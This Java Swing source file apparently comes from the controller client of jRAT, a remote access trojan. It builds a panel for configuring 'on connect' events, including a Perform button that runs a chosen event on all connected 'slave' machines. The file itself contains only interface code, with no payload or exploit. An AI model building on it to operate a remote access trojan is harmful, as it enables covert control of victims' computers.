package se.jrat.client.ui.panels;

import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

import javax.swing.DefaultComboBoxModel;
import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JComboBox;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JTable;
import javax.swing.table.DefaultTableModel;

import se.jrat.client.AbstractSlave;
import se.jrat.client.Main;
import se.jrat.client.events.Event;
import se.jrat.client.events.Events;
import se.jrat.client.ui.components.DefaultJTable;
import se.jrat.client.utils.IconUtils;

import java.awt.BorderLayout;

import javax.swing.JToolBar;

@SuppressWarnings("serial")
public class PanelMainOnConnect extends JPanel {
	
	private JTable table;
	private DefaultTableModel model;

	public PanelMainOnConnect() {		
		final JComboBox<Object> boxOnConnect = new JComboBox<Object>();
		boxOnConnect.setModel(new DefaultComboBoxModel<Object>(Events.events.toArray()));

		JButton btnAdd = new JButton("Add");
		btnAdd.setToolTipText("Add");
		btnAdd.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				Events.add(boxOnConnect.getSelectedItem().toString());
			}
		});

		btnAdd.setIcon(IconUtils.getIcon("calendar-add"));

		final JButton btnDelete = new JButton("Delete");
		btnDelete.setToolTipText("Delete selected event");
		btnDelete.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				String name = model.getValueAt(table.getSelectedRow(), 1).toString();
				if (name != null) {
					Events.remove(name);
					model.removeRow(table.getSelectedRow());
				}
			}
		});
		btnDelete.setIcon(IconUtils.getIcon("calendar-remove"));

		JButton btnPerform = new JButton("Perform");
		btnPerform.setToolTipText("Perform selected event on all connections");
		btnPerform.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				String name = model.getValueAt(table.getSelectedRow(), 1).toString();
				if (name != null) {
					Event event = Events.getByName(name);
					if (event != null) {
						for (AbstractSlave sl : Main.connections) {
							event.perform(sl);
						}
					}
				}
			}
		});
		btnPerform.setIcon(IconUtils.getIcon("calendar-perform"));

		JButton btnEdit = new JButton("Edit");
		btnEdit.setToolTipText("Edit selected event");
		btnEdit.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				String name = model.getValueAt(table.getSelectedRow(), 1).toString();
				if (name != null) {
					Event event = Events.getByName(name);
					if (event != null) {
						if (event.add()) {
							model.removeRow(table.getSelectedRow());
							model.addRow(event.getDisplayData());
						}
					}
				}
			}
		});
		btnEdit.setIcon(IconUtils.getIcon("calendar-edit"));
		
		table = new DefaultJTable() {
			@SuppressWarnings({ "unchecked", "rawtypes" })
			@Override
			public Class getColumnClass(int column) {
				if (column == 0) {
					return ImageIcon.class;
				}
				return super.getColumnClass(column);
			}
		};
		table.setModel(model = new DefaultTableModel(new Object[][] {}, new String[] { " ", "Name", "Type", "", "" }) {
			public boolean isCellEditable(int i, int i1) {
				return false;
			}
		});

		table.getTableHeader().setReorderingAllowed(false);
		table.getColumnModel().getColumn(0).setPreferredWidth(27);
		table.getColumnModel().getColumn(1).setPreferredWidth(133);
		table.getColumnModel().getColumn(2).setPreferredWidth(129);
		table.getColumnModel().getColumn(3).setPreferredWidth(140);
		table.getColumnModel().getColumn(4).setPreferredWidth(175);
		setLayout(new BorderLayout(0, 0));
		table.setRowHeight(20);
		add(new JScrollPane(table), BorderLayout.CENTER);
		
		JToolBar toolBar = new JToolBar();
		toolBar.setFloatable(false);
		add(toolBar, BorderLayout.NORTH);
		
		toolBar.add(btnAdd);
		toolBar.add(btnDelete);
		toolBar.add(btnEdit);
		toolBar.add(btnPerform);
	}

	public void addRow(Object[] displayData) {
		model.addRow(displayData);
	}
}
